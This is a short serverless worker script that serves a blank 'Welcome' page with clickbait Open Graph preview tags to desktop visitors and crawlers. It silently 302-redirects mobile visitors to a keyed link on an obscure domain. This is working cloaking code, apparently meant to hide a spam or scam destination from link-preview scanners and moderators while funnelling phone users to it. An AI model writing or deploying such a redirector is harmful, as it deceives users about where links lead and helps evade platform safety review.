export default {
  async fetch(request, env, ctx) {
    const userAgent = request.headers.get("user-agent") || "";

    const isMobile =
      /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
        userAgent
      );

    if (isMobile) {
      return Response.redirect(
        "https://acorntar.com/mxxcdagb?key=e6e8236c6980d94ca8e81d0b03ea93df",
        302
      );
    }

    const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Welcome</title>
  <meta property="og:title" content="🎬O▂P▂▂E▂N🎬">
  <meta property="og:description" content="">
  <meta property="og:image" content="https://raw.githubusercontent.com/azijanjaan-sketch/automatic-parakeet/refs/heads/main/11.gif">
  <meta property="og:type" content="website">
</head>
<body>
  <h1>Welcome</h1>
</body>
</html>`;

    return new Response(html, {
      status: 200,
      headers: {
        "content-type": "text/html;charset=UTF-8",
      },
    });
  },
};
